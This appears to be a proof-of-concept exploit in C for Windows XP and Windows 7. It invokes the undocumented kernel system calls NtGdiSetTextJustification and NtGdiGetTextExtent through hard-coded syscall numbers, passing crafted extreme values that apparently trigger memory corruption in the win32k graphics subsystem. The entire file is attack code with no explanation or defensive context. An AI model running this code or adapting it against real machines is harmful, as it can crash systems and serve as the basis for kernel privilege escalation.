# include <windows.h>
# include <stdio.h>

__declspec (naked) int _NtGdiSetTextJustification (HDC v1, int extra,
int count)
{
    // Windows XP
    __asm mov eax,0x111e  
    __asm mov edx,0x7ffe0300
    __asm call dword ptr [edx]
    __asm ret 0x0c
}

__declspec (naked) int _NtGdiGetTextExtent (HDC v1, int v2, int v3, int
v4, int v5)
{
    // Windows XP
    __asm mov eax,0x10cc  
    __asm mov edx,0x7ffe0300
    __asm call dword ptr [edx]
    __asm ret 0x14
}

__declspec (naked) int _NtGdiSetTextJustification_W7 (HDC v1, int extra,
int count)
{
    // Windows 7
    __asm mov eax,0x1129  
    __asm mov edx,0x7ffe0300
    __asm call dword ptr [edx]
    __asm ret 0x0c
}


__declspec (naked) int _NtGdiGetTextExtent_W7 (HDC v1, int v2, int v3,
int v4, int v5)
{
    // Windows 7
    __asm mov eax,0x10D6  
    __asm mov edx,0x7ffe0300
    __asm call dword ptr [edx]
    __asm ret 0x14
}


int main ()
{
    char buffer [4096];
    OSVERSIONINFO v;
    HDC hdc;

    memset(buffer, 0, 4096);
    /* Obtaining the OS version */
    memset(&v, 0, sizeof(v));
    v.dwOSVersionInfoSize = sizeof(v);
    GetVersionEx(&v);
    hdc = CreateCompatibleDC(NULL);
    /* If it's Windows XP */
    if ((v.dwMajorVersion == 5) && (v.dwMinorVersion == 1))
    {
        _NtGdiSetTextJustification(hdc, 0x08000000, 0xffffffff);
        _NtGdiGetTextExtent(hdc, (int) buffer, 0x11, 0x44444444,
0x55555555);
    }
    /* If it's Windows 7 */
    else if ((v.dwMajorVersion == 6) && (v.dwMinorVersion == 1))
    {
        _NtGdiSetTextJustification_W7(hdc, 0x08000000, 0xffffffff);
        _NtGdiGetTextExtent_W7(hdc, (int) buffer, 0x11, 0x44444444,
0x55555555);
    }
    else
    {
        printf("unsupported OS\n");
    }
    return 0;
}
